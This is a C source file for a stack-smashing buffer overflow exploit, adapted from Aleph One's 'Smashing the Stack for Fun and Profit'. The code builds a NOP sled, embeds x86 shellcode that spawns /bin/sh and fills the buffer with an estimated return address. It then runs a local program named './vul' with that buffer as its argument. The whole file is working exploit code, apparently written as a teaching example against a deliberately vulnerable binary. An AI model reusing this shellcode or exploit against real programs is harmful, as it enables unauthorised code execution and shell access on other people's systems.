/*
 * Stack-smashing exploit code based on that given in Smashing the Stack for
 * Fun and Profit by Aleph One.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define	NOP 0x90

static char shellcode[] =
"\xeb\x12\x5e\x31\xc0\x88\x46\x07"
"\x50\x56\x31\xd2\x89\xe1\x89\xf3"
"\xb0\x0b\xcd\x80\xe8\xe9\xff\xff"
"\xff\x2f\x62\x69\x6e\x2f\x73\x68";

/* Neat way of determining stack top address */
unsigned int
getesp(void)
{
  __asm__("movl     %esp,%eax");
}

int
main(int argc, const char *argv[])
{
  unsigned int addr, bytes, *ptr;
  char *args[3], *code;
  int i, numints;

  /* Check command line arguments */
  if (argc != 3) {
    printf("Usage: %s buffer-bytes offset\n", argv[0]);
    exit(EXIT_FAILURE);
  }
  
  /* Where does our stack start? */
  printf("Stack: %p\n", (void *)getesp());

  /* Estimate new return address */
  addr = getesp() - strtoul(argv[2], NULL, 10);
  printf("New return address %p\n", (void *)addr);

  /* Allocate space for our string (we add one extra for the null byte) */
  bytes = atoi(argv[1]) + 1;
  code = calloc(bytes, 1);
  if (code == NULL) {
    perror("malloc()");
    exit(EXIT_FAILURE);
  }

  /* Fill buffer with return address */
  numints = bytes / sizeof (*ptr);
  ptr = (unsigned int *)code;
  for (i = 0; i < numints; i++) {
    ptr[i] = addr;
  }

  /* Reset first half to NOPs */
  memset((void *)code, NOP, (bytes >> 1));

  /* Place shellcode after NOPs */
  memcpy(code + (bytes >> 1), shellcode, strlen(shellcode));

  /* Set up for call to vulnerable program */
  printf("Sending in buffer length: %d\n", strlen(code));
  args[0] = "./vul";
  args[1] = code;
  args[2] = NULL;

  /* Attack */
  execlp(args[0], args[0], args[1], args[2]);

  return (0);
}
